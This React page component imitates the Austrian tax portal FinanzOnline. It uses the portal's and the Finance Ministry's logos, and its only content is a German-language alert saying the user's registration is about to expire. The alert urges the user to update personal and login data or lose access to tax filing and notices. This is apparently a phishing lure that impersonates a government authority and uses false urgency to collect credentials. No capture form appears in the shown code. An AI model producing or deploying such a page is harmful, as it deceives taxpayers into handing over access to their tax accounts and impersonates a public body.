import finanzonlineLogo from "@/assets/finanzonline_at_Logo.svg";
import bmfLogo from "@/assets/bmf_logo.svg";
import { Info } from "lucide-react";

const Index = () => {
  return (
    <div className="min-h-screen bg-white">
      <header className="bg-white">
        <div className="container mx-auto flex items-center justify-between px-4 py-4">
          <div>
            <a href="#">
              <span className="sr-only">Zur Startseite</span>
              <img src={finanzonlineLogo} alt="FinanzOnline" className="h-8 md:h-12" />
            </a>
          </div>
          <div>
            <a
              href="https://www.bmf.gv.at/public.html"
              target="_blank"
              rel="noopener noreferrer"
            >
              <span className="sr-only">Zur Homepage des Bundesministerium für Finanzen</span>
              <img src={bmfLogo} alt="BMF Logo" className="h-8 md:h-10" />
            </a>
          </div>
        </div>
        <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
          Willkommen bei FinanzOnline
        </h1>
      </header>

      <div className="container mx-auto px-4 py-4">
        <div className="rounded border-l-4 border-[#666] bg-[#f5f5f5] p-5" role="alert">
          <div className="mb-3 flex items-center gap-2">
            <Info className="h-5 w-5 text-gray-700" />
            <span className="text-base font-bold text-gray-900">Hinweis</span>
          </div>
          <div className="text-sm leading-relaxed text-gray-800">
            <p className="mb-3">
              <b>Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten</b>
            </p>
            <p className="mb-3">
              Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin Zugang zu allen Services zu gewährleisten, überprüfen und aktualisieren Sie bitte Ihre persönlichen Daten sowie Zugangsdaten zeitnah.
            </p>
            <p>
              Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr Zugang eingeschränkt oder vorübergehend gesperrt werden – einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
